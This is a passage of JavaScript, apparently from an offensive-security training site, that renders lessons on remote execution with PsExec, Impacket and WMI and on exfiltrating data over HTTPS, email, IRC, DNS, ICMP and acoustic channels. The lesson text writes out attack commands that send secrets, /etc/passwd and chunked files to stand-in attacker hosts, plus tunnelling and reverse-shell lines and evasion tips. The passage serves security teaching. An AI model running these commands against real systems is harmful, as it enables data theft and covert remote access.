    function demoPsexecRemote(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">REMOTE</span><span class="demo-title">Remote Command Execution</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="psexecTabs">
                <button class="demo-btn demo-btn-sm active" data-t="psexec">PsExec</button>
                <button class="demo-btn demo-btn-sm" data-t="impacket">Impacket Suite</button>
                <button class="demo-btn demo-btn-sm" data-t="wmiexec">WMI Exec</button>
            </div>
            <div id="psexecOut" style="background:#0d1117;color:#ff7b72;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            psexec: 'PSEXEC - SYSINTERNALS TOOL:\n\n# Basic usage\npsexec \\\\TARGET -u DOMAIN\\admin -p password cmd.exe\n\n# Run as SYSTEM\npsexec \\\\TARGET -s cmd.exe\n\n# Execute command and exit\npsexec \\\\TARGET -u admin -p pass cmd /c "whoami > C:\\out.txt"\n\n# Copy program and execute\npsexec \\\\TARGET -c payload.exe\n\nHow PsExec Works:\n1. Connect to ADMIN$ share (\\\\TARGET\\ADMIN$)\n2. Upload PSEXESVC.exe to C:\\Windows\\\n3. Create service: PSEXESVC\n4. Start service → executes our command\n5. I/O redirected through named pipes\n6. Cleanup service (optional)\n\nDetection Artifacts:\n├─ Event 7045: Service installed\n├─ Event 4624: Network logon\n├─ File: PSEXESVC.exe on target\n└─ Service: PSEXESVC running',
            impacket: 'IMPACKET SUITE - PYTHON TOOLS:\n\n# psexec.py - PsExec clone\npython psexec.py DOMAIN/admin:password@TARGET\npython psexec.py -hashes :NTLM admin@TARGET\n\n# smbexec.py - No binary upload!\npython smbexec.py DOMAIN/admin:password@TARGET\n# Creates service that echoes commands to file\n\n# wmiexec.py - WMI-based (semi-interactive)\npython wmiexec.py DOMAIN/admin:password@TARGET\n\n# atexec.py - Task Scheduler\npython atexec.py DOMAIN/admin:password@TARGET "whoami"\n\n# dcomexec.py - DCOM objects\npython dcomexec.py -object MMC20 admin:pass@TARGET\n\nAdvantages:\n├─ Cross-platform (Python)\n├─ Pass-the-Hash support\n├─ Multiple execution methods\n└─ Harder to detect than PsExec',
            wmiexec: 'WMI EXECUTION METHODS:\n\n# Windows native WMIC\nwmic /node:TARGET /user:admin /password:pass\n    process call create "cmd.exe /c whoami > C:\\out.txt"\n\n# PowerShell Invoke-WmiMethod\n$cred = Get-Credential\nInvoke-WmiMethod -ComputerName TARGET -Credential $cred\n    -Class Win32_Process -Name Create\n    -ArgumentList "powershell.exe -enc BASE64"\n\n# CIM (newer, preferred)\nInvoke-CimMethod -ComputerName TARGET -Credential $cred\n    -ClassName Win32_Process -MethodName Create\n    -Arguments @{CommandLine="calc.exe"}\n\n# impacket wmiexec.py\npython wmiexec.py -shell-type powershell admin:pass@TARGET\n\nWMI Advantages:\n├─ Fileless (no binary uploaded)\n├─ Uses native Windows protocols\n├─ Output via temp files or WMI objects\n└─ Stealthier than PsExec'
        };
        $('#psexecOut').textContent = data.psexec;
        $$('#psexecTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#psexecTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#psexecOut').textContent = data[b.dataset.t];
            };
        });
    }

    // Backward compatibility
    function demoLateralMovement(pane) { demoLateralMovementIntro(pane); }

    // C10 Lesson 1: exfiltration-intro - Introduction to Data Exfiltration
    function demoExfiltrationIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">EXFIL</span><span class="demo-title">Introduction to Data Exfiltration</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="exfilIntroTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What Is It?</button>
                <button class="demo-btn demo-btn-sm" data-t="goals">Goals</button>
                <button class="demo-btn demo-btn-sm" data-t="targets">Targets</button>
            </div>
            <div id="exfilIntroOut" style="background:#1a1a1a;color:#f97583;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT IS DATA EXFILTRATION?\n\n  Data exfiltration is the unauthorized\n  transfer of data from a target system\n  to an attacker-controlled location.\n\n  Also known as:\n  • Data theft\n  • Data extrusion\n  • Data exportation\n\n  ┌─────────────────┐      ┌──────────────┐\n  │  Target System  │ ───► │  Attacker C2 │\n  │   (Victim)      │      │   (Control)  │\n  └─────────────────┘      └──────────────┘\n        Sensitive             Stolen\n          Data                 Data\n\n  ⚠️ Final stage of most APT attacks\n  ⚠️ Often goes undetected for months',
            goals: 'EXFILTRATION GOALS:\n\n  ┌────────────────────────────────────┐\n  │ 1. STEAL VALUABLE DATA             │\n  │    • Intellectual property          │\n  │    • Trade secrets                  │\n  │    • Customer databases             │\n  │    • Financial records              │\n  └────────────────────────────────────┘\n\n  ┌────────────────────────────────────┐\n  │ 2. AVOID DETECTION                 │\n  │    • Blend with normal traffic      │\n  │    • Use encryption                 │\n  │    • Slow & low approach            │\n  │    • Covert channels                │\n  └────────────────────────────────────┘\n\n  ┌────────────────────────────────────┐\n  │ 3. MAINTAIN ACCESS                 │\n  │    • Leave backdoors                │\n  │    • Exfil credentials for later    │\n  └────────────────────────────────────┘',
            targets: 'COMMON EXFILTRATION TARGETS:\n\n  HIGH VALUE:\n  ├── /etc/passwd, /etc/shadow\n  ├── ~/.ssh/id_rsa (SSH keys)\n  ├── Browser saved passwords\n  ├── Database dumps (.sql)\n  └── Source code repositories\n\n  CORPORATE DATA:\n  ├── Customer PII (names, SSN, CC)\n  ├── Employee records\n  ├── Financial statements\n  ├── Strategic documents\n  └── Email archives (.pst, .ost)\n\n  CREDENTIALS:\n  ├── SAM/NTDS.dit (Windows)\n  ├── Kerberos tickets\n  ├── API keys & tokens\n  └── Cloud credentials\n\n  ⚠️ Data staged before exfil\n  ⚠️ Often compressed/encrypted first'
        };
        $('#exfilIntroOut').textContent = data.what;
        $$('#exfilIntroTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#exfilIntroTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#exfilIntroOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 2: exfiltration-techniques - Exfiltration Techniques Overview
    function demoExfiltrationTechniques(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">EXFIL</span><span class="demo-title">Exfiltration Techniques Overview</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="exfilTechTabs">
                <button class="demo-btn demo-btn-sm active" data-t="covert">Covert Channels</button>
                <button class="demo-btn demo-btn-sm" data-t="encrypt">Encryption</button>
                <button class="demo-btn demo-btn-sm" data-t="staging">Staging</button>
            </div>
            <div id="exfilTechOut" style="background:#1a1a1a;color:#f97583;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            covert: 'COVERT CHANNELS:\n\n  Hidden communication paths that bypass\n  security monitoring and controls.\n\n  NETWORK COVERT CHANNELS:\n  ┌────────────────────────────────────┐\n  │ • DNS tunneling (subdomain data)   │\n  │ • ICMP payload (ping data)         │\n  │ • HTTP headers (custom fields)     │\n  │ • TCP sequence numbers             │\n  │ • Steganography in images          │\n  └────────────────────────────────────┘\n\n  TIMING CHANNELS:\n  ┌────────────────────────────────────┐\n  │ • Packet timing patterns           │\n  │ • CPU cache timing attacks         │\n  │ • Inter-arrival time encoding      │\n  └────────────────────────────────────┘\n\n  ⚠️ Low bandwidth but very stealthy\n  ⚠️ Hard to detect with standard tools',
            encrypt: 'ENCRYPTION FOR EXFILTRATION:\n\n  # Encrypt before exfiltration\n  openssl enc -aes-256-cbc -salt \\\n    -in secrets.tar -out secrets.enc\n\n  # Or use GPG\n  gpg -c --cipher-algo AES256 secrets.tar\n\n  ENCODING TECHNIQUES:\n  ┌────────────────────────────────────┐\n  │ Base64:  Alphanumeric + /=         │\n  │ Hex:     0-9, A-F characters       │\n  │ Base32:  A-Z, 2-7 (DNS safe)       │\n  │ Custom:  Domain-specific encoding  │\n  └────────────────────────────────────┘\n\n  BENEFITS:\n  ✓ DLP cannot inspect encrypted data\n  ✓ Appears as random noise\n  ✓ Prevents content-based detection\n\n  ⚠️ Encryption ≠ Invisibility\n  ⚠️ Traffic patterns still detectable',
            staging: 'DATA STAGING:\n\n  Prepare data before exfiltration.\n\n  STAGING PROCESS:\n  ┌─────────┐   ┌─────────┐   ┌─────────┐\n  │ Collect │ → │ Compress│ → │ Encrypt │\n  └─────────┘   └─────────┘   └─────────┘\n        │             │             │\n        ▼             ▼             ▼\n   Find files    tar/zip      AES-256\n\n  # Example staging command\n  find / -name "*.docx" -exec cp {} /tmp/s/ \\;\n  tar czf /tmp/data.tgz /tmp/s/\n  openssl enc -aes256 -in data.tgz -out data.enc\n\n  STAGING LOCATIONS:\n  • /tmp, /var/tmp\n  • Recycle bin\n  • Alternate data streams (NTFS)\n  • Hidden directories (.folder)\n\n  ⚠️ Chunk large files for transfer\n  ⚠️ Use different exit points'
        };
        $('#exfilTechOut').textContent = data.covert;
        $$('#exfilTechTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#exfilTechTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#exfilTechOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 3: https-exfiltration - HTTPS Exfiltration
    function demoHttpsExfiltration(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">EXFIL</span><span class="demo-title">HTTPS Exfiltration</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="httpsTabs">
                <button class="demo-btn demo-btn-sm active" data-t="post">HTTPS POST</button>
                <button class="demo-btn demo-btn-sm" data-t="chunk">Chunking</button>
                <button class="demo-btn demo-btn-sm" data-t="blend">Blending</button>
            </div>
            <div id="httpsOut" style="background:#1a1a1a;color:#f97583;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            post: 'HTTPS POST EXFILTRATION:\n\n  # Simple POST with data\n  curl -X POST https://attacker.com/upload \\\n       -d @sensitive_data.txt\n\n  # Base64 encoded POST\n  cat secret.txt | base64 | \\\n    curl -X POST -d @- https://c2.attacker.com/data\n\n  # JSON formatted (looks like API call)\n  curl -X POST https://api.attacker.com/v1/sync \\\n       -H "Content-Type: application/json" \\\n       -d \'{"data":"\'$(base64 secret.txt)\'"}\'\n\n  WHY HTTPS?\n  ✓ Port 443 almost always allowed\n  ✓ TLS encryption hides content\n  ✓ Cannot inspect without MITM\n  ✓ Massive legitimate traffic volume',
            chunk: 'CHUNKED EXFILTRATION:\n\n  # Split large files into chunks\n  split -b 10k largefile.zip chunk_\n\n  # Exfiltrate chunks with delays\n  for chunk in chunk_*; do\n    curl -X POST -d @$chunk \\\n      https://c2.attacker.com/u?f=$chunk\n    sleep $((RANDOM % 60 + 30))  # 30-90s delay\n  done\n\n  CHUNKING STRATEGY:\n  ┌──────────┬─────────────────────────┐\n  │ Size     │ Purpose                 │\n  ├──────────┼─────────────────────────┤\n  │ 1-10 KB  │ Mimic normal POST size  │\n  │ 30-90s   │ Avoid rate detection    │\n  │ Random   │ Evade pattern analysis  │\n  └──────────┴─────────────────────────┘\n\n  ⚠️ Reconstruct: cat chunk_* > original\n  ⚠️ Add checksums for verification',
            blend: 'BLENDING WITH TRAFFIC:\n\n  Make exfil look like legitimate traffic.\n\n  TECHNIQUES:\n  ┌────────────────────────────────────┐\n  │ • Use real API endpoints            │\n  │   POST /api/analytics/events        │\n  │   POST /api/telemetry/data          │\n  │                                      │\n  │ • Mimic user agents                  │\n  │   Mozilla/5.0 (Windows NT 10.0...)  │\n  │                                      │\n  │ • Add realistic headers              │\n  │   Referer: https://legitimate.com   │\n  │   X-Requested-With: XMLHttpRequest  │\n  └────────────────────────────────────┘\n\n  DOMAIN FRONTING:\n  ┌─────────────────────────────────────┐\n  │ Host: cdn.microsoft.com (visible)   │\n  │ SNI:  cdn.microsoft.com (visible)   │\n  │ →→→   c2.attacker.com (hidden)      │\n  └─────────────────────────────────────┘\n\n  ✓ Appears as CDN traffic\n  ✓ Difficult to block without collateral'
        };
        $('#httpsOut').textContent = data.post;
        $$('#httpsTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#httpsTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#httpsOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 4: smtp-exfiltration - SMTP/Email Exfiltration
    function demoSmtpExfiltration(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">EXFIL</span><span class="demo-title">SMTP/Email Exfiltration</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="smtpTabs">
                <button class="demo-btn demo-btn-sm active" data-t="basic">Email Exfil</button>
                <button class="demo-btn demo-btn-sm" data-t="attach">Attachments</button>
                <button class="demo-btn demo-btn-sm" data-t="encode">Encoding</button>
            </div>
            <div id="smtpOut" style="background:#1a1a1a;color:#f97583;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            basic: 'EMAIL-BASED EXFILTRATION:\n\n  # Using sendmail/mail command\n  cat /etc/passwd | mail -s "Report" attacker@mail.com\n\n  # Using Python smtplib\n  python3 -c \'\n  import smtplib\n  from email.mime.text import MIMEText\n  \n  msg = MIMEText(open("/etc/passwd").read())\n  msg["Subject"] = "Daily Report"\n  msg["From"] = "internal@company.com"\n  msg["To"] = "attacker@external.com"\n  \n  s = smtplib.SMTP("mail.company.com")\n  s.send_message(msg)\n  \'\n\n  WHY EMAIL?\n  ✓ Often allowed outbound (port 25/587)\n  ✓ Legitimate business channel\n  ✓ Can use existing mail infrastructure',
            attach: 'ATTACHMENT EXFILTRATION:\n\n  # PowerShell (Windows)\n  $outlook = New-Object -ComObject Outlook.Application\n  $mail = $outlook.CreateItem(0)\n  $mail.To = "attacker@external.com"\n  $mail.Subject = "Quarterly Report"\n  $mail.Body = "Please review attached."\n  $mail.Attachments.Add("C:\\secrets\\data.zip")\n  $mail.Send()\n\n  # Python with attachment\n  from email.mime.multipart import MIMEMultipart\n  from email.mime.base import MIMEBase\n  \n  msg = MIMEMultipart()\n  attachment = MIMEBase("application", "octet-stream")\n  attachment.set_payload(open("data.zip","rb").read())\n  msg.attach(attachment)\n\n  ⚠️ DLP may scan attachments\n  ⚠️ Use password-protected archives\n  ⚠️ Rename file extensions (.zip→.dat)',
            encode: 'ENCODED EMAIL EXFILTRATION:\n\n  ENCODING IN EMAIL BODY:\n  ┌────────────────────────────────────┐\n  │ # Base64 in body                   │\n  │ cat secret.txt | base64 > body.txt │\n  │ mail -s "Data" attacker@mail.com  │\n  │      < body.txt                    │\n  └────────────────────────────────────┘\n\n  STEGANOGRAPHY:\n  ┌────────────────────────────────────┐\n  │ # Hide data in image attachment    │\n  │ steghide embed -cf image.jpg \\     │\n  │   -ef secret.txt                   │\n  │ # Attach image.jpg to email        │\n  └────────────────────────────────────┘\n\n  DRAFT FOLDER TECHNIQUE:\n  ┌────────────────────────────────────┐\n  │ 1. Login to shared webmail account │\n  │ 2. Save exfil data as draft        │\n  │ 3. Attacker reads draft            │\n  │ 4. Never actually send email       │\n  │    → No SMTP logs!                 │\n  └────────────────────────────────────┘'
        };
        $('#smtpOut').textContent = data.basic;
        $$('#smtpTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#smtpTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#smtpOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 5: irc-exfiltration - IRC Channel Exfiltration
    function demoIrcExfiltration(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">EXFIL</span><span class="demo-title">IRC Channel Exfiltration</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="ircTabs">
                <button class="demo-btn demo-btn-sm active" data-t="c2">IRC as C2</button>
                <button class="demo-btn demo-btn-sm" data-t="data">Data Transfer</button>
                <button class="demo-btn demo-btn-sm" data-t="detect">Detection</button>
            </div>
            <div id="ircOut" style="background:#1a1a1a;color:#f97583;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            c2: 'IRC AS COMMAND & CONTROL:\n\n  IRC BOTNET ARCHITECTURE:\n  ┌──────────────────────────────────────┐\n  │           IRC Server                 │\n  │         (irc.attacker.com)           │\n  │              #botnet                 │\n  └───────────────┬──────────────────────┘\n                  │\n    ┌─────────────┼─────────────┐\n    │             │             │\n  ┌─▼─┐         ┌─▼─┐         ┌─▼─┐\n  │Bot│         │Bot│         │Bot│\n  └───┘         └───┘         └───┘\n  Victim1      Victim2       Victim3\n\n  # Bot connects to IRC channel\n  irc.connect("irc.attacker.com", 6667)\n  irc.join("#botnet")\n  \n  # Waits for commands from operator\n  !exfil /etc/passwd\n  !upload C:\\Users\\*\\Documents\\*\n\n  ⚠️ Classic botnet technique\n  ⚠️ Now often blocked at firewalls',
            data: 'IRC DATA TRANSFER:\n\n  # DCC SEND (Direct Client-to-Client)\n  /dcc send attacker secret.zip\n\n  # Encoded in channel messages\n  PRIVMSG #exfil :c2VjcmV0IGRhdGEgaGVyZQ==\n  PRIVMSG #exfil :bmV4dCBjaHVuayBvZiBkYXRh\n\n  CHUNKED MESSAGE TRANSFER:\n  ┌────────────────────────────────────┐\n  │ for chunk in base64_chunks:        │\n  │     irc.privmsg("#exfil", chunk)   │\n  │     time.sleep(2)  # avoid flood   │\n  └────────────────────────────────────┘\n\n  PRIVATE MESSAGES:\n  ┌────────────────────────────────────┐\n  │ /msg bot_master <encoded_data>     │\n  │ → Avoids channel logging           │\n  └────────────────────────────────────┘\n\n  ⚠️ IRC has message size limits (~512 bytes)\n  ⚠️ Must chunk large data transfers',
            detect: 'IRC EXFILTRATION DETECTION:\n\n  NETWORK INDICATORS:\n  ┌────────────────────────────────────┐\n  │ • Port 6667, 6697 (SSL) outbound   │\n  │ • Long-lived TCP connections       │\n  │ • IRC protocol signatures:         │\n  │   - NICK, USER, JOIN, PRIVMSG      │\n  │ • DCC SEND file transfers          │\n  └────────────────────────────────────┘\n\n  EVASION TECHNIQUES:\n  ┌────────────────────────────────────┐\n  │ • IRC over TLS (port 6697)         │\n  │ • IRC over Tor hidden services     │\n  │ • Non-standard ports (80, 443)     │\n  │ • IRC over HTTP tunnels            │\n  └────────────────────────────────────┘\n\n  DETECTION RULES:\n  alert tcp any any -> any 6667 (\n    content:"PRIVMSG"; content:"#";\n    msg:"Possible IRC C2 channel";\n  )\n\n  ⚠️ Many orgs block IRC entirely\n  ⚠️ Less common in modern attacks'
        };
        $('#ircOut').textContent = data.c2;
        $$('#ircTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#ircTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#ircOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 6: dns-exfiltration - DNS Tunneling Exfiltration
    function demoDnsExfiltration(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">EXFIL</span><span class="demo-title">DNS Tunneling Exfiltration</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dnsTabs">
                <button class="demo-btn demo-btn-sm active" data-t="tunnel">DNS Tunneling</button>
                <button class="demo-btn demo-btn-sm" data-t="tools">dnscat2/iodine</button>
                <button class="demo-btn demo-btn-sm" data-t="subdomain">Subdomain Encoding</button>
            </div>
            <div id="dnsOut" style="background:#1a1a1a;color:#f97583;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            tunnel: 'DNS TUNNELING OVERVIEW:\n\n  Encode data in DNS queries/responses.\n\n  HOW IT WORKS:\n  ┌─────────┐     DNS Query:              ┌─────────┐\n  │ Victim  │ ──c2VjcmV0.exfil.evil.com──► │Attacker │\n  │         │ ◄─────TXT: response data──── │   DNS   │\n  └─────────┘                              └─────────┘\n\n  DATA IN SUBDOMAIN:\n  ┌────────────────────────────────────────┐\n  │ echo "secret" | base64                 │\n  │ → c2VjcmV0                             │\n  │                                        │\n  │ DNS Query: c2VjcmV0.tunnel.evil.com    │\n  │            └──────┘                    │\n  │              Data!                     │\n  └────────────────────────────────────────┘\n\n  WHY DNS?\n  ✓ DNS (port 53) rarely blocked\n  ✓ Often bypasses proxies\n  ✓ UDP = connectionless, harder to track',
            tools: 'DNS TUNNELING TOOLS:\n\n  DNSCAT2:\n  ┌────────────────────────────────────┐\n  │ # Server (attacker)                │\n  │ dnscat2 --dns server=attacker.com  │\n  │                                    │\n  │ # Client (victim)                  │\n  │ dnscat2 attacker.com               │\n  │                                    │\n  │ # Shell access                     │\n  │ dnscat2> shell                     │\n  │ dnscat2> download /etc/passwd      │\n  └────────────────────────────────────┘\n\n  IODINE:\n  ┌────────────────────────────────────┐\n  │ # Server                           │\n  │ iodined -f 10.0.0.1 tunnel.evil.com│\n  │                                    │\n  │ # Client                           │\n  │ iodine -f tunnel.evil.com          │\n  │                                    │\n  │ # Creates virtual network interface│\n  │ # Full TCP/IP over DNS!            │\n  └────────────────────────────────────┘\n\n  Also: dns2tcp, DNSExfiltrator',
            subdomain: 'SUBDOMAIN ENCODING:\n\n  MAX SUBDOMAIN LENGTH: 63 chars\n  MAX DOMAIN LENGTH: 253 chars\n\n  ENCODING STRATEGY:\n  ┌────────────────────────────────────┐\n  │ Original: "password123"            │\n  │ Hex:      70617373776f7264313233   │\n  │ Base32:   OBSXE43JN5XC4TBHMNQWI=== │\n  │ Base64:   cGFzc3dvcmQxMjM=         │\n  └────────────────────────────────────┘\n\n  CHUNKED DNS QUERIES:\n  ┌────────────────────────────────────┐\n  │ Large file → Split into chunks    │\n  │                                    │\n  │ chunk1.tunnel.evil.com             │\n  │ chunk2.tunnel.evil.com             │\n  │ chunk3.tunnel.evil.com             │\n  │ ...                                │\n  │                                    │\n  │ # ~60 bytes per query              │\n  │ # Slow but stealthy                │\n  └────────────────────────────────────┘\n\n  ⚠️ Detection: unusual query volume\n  ⚠️ Long subdomain labels (>20 chars)'
        };
        $('#dnsOut').textContent = data.tunnel;
        $$('#dnsTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#dnsTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#dnsOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 7: icmp-exfiltration - ICMP Tunneling Exfiltration
    function demoIcmpExfiltration(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">EXFIL</span><span class="demo-title">ICMP Tunneling Exfiltration</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="icmpTabs">
                <button class="demo-btn demo-btn-sm active" data-t="tunnel">ICMP Tunneling</button>
                <button class="demo-btn demo-btn-sm" data-t="ptunnel">PTunnel</button>
                <button class="demo-btn demo-btn-sm" data-t="echo">Echo Requests</button>
            </div>
            <div id="icmpOut" style="background:#1a1a1a;color:#f97583;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            tunnel: 'ICMP TUNNELING OVERVIEW:\n\n  Hide data in ICMP packet payloads.\n\n  ICMP PACKET STRUCTURE:\n  ┌────────┬────────┬────────┬──────────────┐\n  │  Type  │  Code  │Checksum│    DATA      │\n  │   8    │   0    │  xxxx  │ YOUR PAYLOAD │\n  └────────┴────────┴────────┴──────────────┘\n     Echo Request        └── Hidden data here!\n\n  WHY ICMP?\n  ┌────────────────────────────────────┐\n  │ ✓ Ping is often allowed outbound   │\n  │ ✓ ICMP payload rarely inspected    │\n  │ ✓ No ports to monitor              │\n  │ ✓ Stateless - hard to track        │\n  └────────────────────────────────────┘\n\n  LIMITATIONS:\n  ┌────────────────────────────────────┐\n  │ ✗ Small payload (~1400 bytes max)  │\n  │ ✗ Many firewalls block ICMP        │\n  │ ✗ Requires raw socket access       │\n  └────────────────────────────────────┘',
            ptunnel: 'PTUNNEL (PING TUNNEL):\n\n  TCP over ICMP tunneling tool.\n\n  # Server (attacker/proxy)\n  ptunnel -x secretpassword\n\n  # Client (victim)\n  ptunnel -p proxy.attacker.com \\\n          -lp 8000 \\\n          -da target.internal \\\n          -dp 22 \\\n          -x secretpassword\n\n  # Now connect through tunnel\n  ssh -p 8000 user@localhost\n\n  HOW IT WORKS:\n  ┌─────────┐  ICMP  ┌─────────┐  TCP  ┌─────────┐\n  │ Client  │◄─────►│  Proxy  │◄────►│ Target  │\n  │         │ ping  │         │ SSH  │         │\n  └─────────┘       └─────────┘      └─────────┘\n\n  ICMPSH:\n  # Reverse ICMP shell\n  icmpsh_m.py <attacker_ip> <victim_ip>\n\n  ⚠️ Requires root/admin privileges',
            echo: 'DATA IN ECHO REQUESTS:\n\n  # Using hping3\n  hping3 -1 -e "secret_data" \\\n         -d 100 attacker.com\n\n  # Using ping with hex pattern\n  # "secret" = 736563726574\n  ping -p 736563726574 attacker.com\n\n  PYTHON ICMP EXFILTRATION:\n  ┌────────────────────────────────────┐\n  │ import socket                      │\n  │ sock = socket.socket(             │\n  │     socket.AF_INET,                │\n  │     socket.SOCK_RAW,               │\n  │     socket.IPPROTO_ICMP)           │\n  │                                    │\n  │ # Build ICMP packet with data      │\n  │ packet = icmp_header + secret_data │\n  │ sock.sendto(packet, (target, 0))   │\n  └────────────────────────────────────┘\n\n  DETECTION:\n  • Unusually large ICMP payloads\n  • High volume of ping traffic\n  • Non-standard ICMP types/codes\n  • Bidirectional ICMP conversations'
        };
        $('#icmpOut').textContent = data.tunnel;
        $$('#icmpTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#icmpTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#icmpOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 8: acoustic-exfiltration - Acoustic/Air-Gap Exfiltration
    function demoAcousticExfiltration(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">EXFIL</span><span class="demo-title">Acoustic/Air-Gap Exfiltration</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="acousticTabs">
                <button class="demo-btn demo-btn-sm active" data-t="airgap">Air-Gapped Systems</button>
                <button class="demo-btn demo-btn-sm" data-t="audio">Audio Channels</button>
                <button class="demo-btn demo-btn-sm" data-t="exotic">Exotic Channels</button>
            </div>
            <div id="acousticOut" style="background:#1a1a1a;color:#f97583;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            airgap: 'AIR-GAPPED SYSTEM EXFILTRATION:\n\n  Air-gapped = No network connection.\n  Used for: classified systems, SCADA, etc.\n\n  THE CHALLENGE:\n  ┌─────────────────────────────────────┐\n  │    ████████████████████████████     │\n  │    █ AIR-GAPPED SYSTEM █  ← No    │\n  │    █  (isolated network)  █  network│\n  │    ████████████████████████████     │\n  │              ▲                      │\n  │              │ ???                  │\n  │              ▼                      │\n  │    ┌─────────────────┐              │\n  │    │ Attacker System │              │\n  │    └─────────────────┘              │\n  └─────────────────────────────────────┘\n\n  ATTACK VECTORS:\n  • USB devices (Stuxnet)\n  • Supply chain implants\n  • Insider threats\n  • Covert physical channels',
            audio: 'AUDIO COVERT CHANNELS:\n\n  SPEAKER → MICROPHONE EXFIL:\n  ┌─────────────────────────────────────┐\n  │  Infected Air-Gapped PC             │\n  │  ┌─────────┐                        │\n  │  │ Malware │ → Speakers → )))       │\n  │  └─────────┘   (ultrasonic)         │\n  │                     │               │\n  │                     ▼               │\n  │              ┌────────────┐         │\n  │              │ Nearby     │         │\n  │              │ Smartphone │         │\n  │              │ (records)  │         │\n  │              └────────────┘         │\n  └─────────────────────────────────────┘\n\n  TECHNIQUES:\n  • Ultrasonic frequencies (>18kHz)\n  • Inaudible to humans\n  • Smartphone mic can detect\n  • ~20 bits/second bandwidth\n\n  RESEARCH:\n  • MOSQUITO: Speaker-to-speaker\n  • FANSMITTER: CPU fan modulation\n  • DiskFiltration: HDD sounds',
